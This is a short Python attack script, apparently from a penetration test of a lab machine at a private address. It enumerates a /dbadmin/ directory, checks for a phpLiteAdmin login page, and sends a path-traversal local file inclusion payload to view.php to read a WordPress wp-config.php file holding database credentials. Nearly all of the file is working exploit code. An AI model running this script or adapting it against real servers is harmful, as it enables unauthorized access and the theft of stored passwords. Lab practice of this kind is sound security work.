import urllib.request, socket, re
socket.setdefaulttimeout(10)
base = "http://192.168.18.132"

print("=== Checking /dbadmin/ ===")
try:
    req = urllib.request.Request(base + "/dbadmin/", headers={"User-Agent": "WVS/1.0"})
    resp = urllib.request.urlopen(req, timeout=5)
    content = resp.read().decode("utf-8", errors="ignore")
    print(f"Status: {resp.status}")
    print(f"Files found:")
    links = re.findall(r'href=["\x27]([^"\x27>\s]+)["\x27]', content)
    for link in links[:20]:
        print(f"  {link}")
except Exception as e:
    print(f"Error: {e}")

print("\n=== Checking test_db.php (phpLiteAdmin) ===")
try:
    req = urllib.request.Request(base + "/dbadmin/test_db.php", headers={"User-Agent": "WVS/1.0"})
    resp = urllib.request.urlopen(req, timeout=5)
    content = resp.read().decode("utf-8", errors="ignore")
    print(f"Status: {resp.status}")
    if "phpLiteAdmin" in content or "login" in content.lower():
        print("  -> phpLiteAdmin login page detected!")
        print(content[:500])
except Exception as e:
    print(f"Error: {e}")

# Try to access wp-config via LFI
print("\n=== Reading wp-config.php via LFI ===")
try:
    payload = "page=../../../home/zico/wordpress/wp-config.php"
    url = base + "/view.php?" + payload
    req = urllib.request.Request(url, headers={"User-Agent": "WVS/1.0"})
    resp = urllib.request.urlopen(req, timeout=5)
    content = resp.read().decode("utf-8", errors="ignore")
    if "DB_" in content or "password" in content.lower():
        print("[FOUND] wp-config.php content:")
        print(content[:1000])
    else:
        print(f"  Length: {len(content)} bytes")
except Exception as e:
    print(f"Error: {e}")
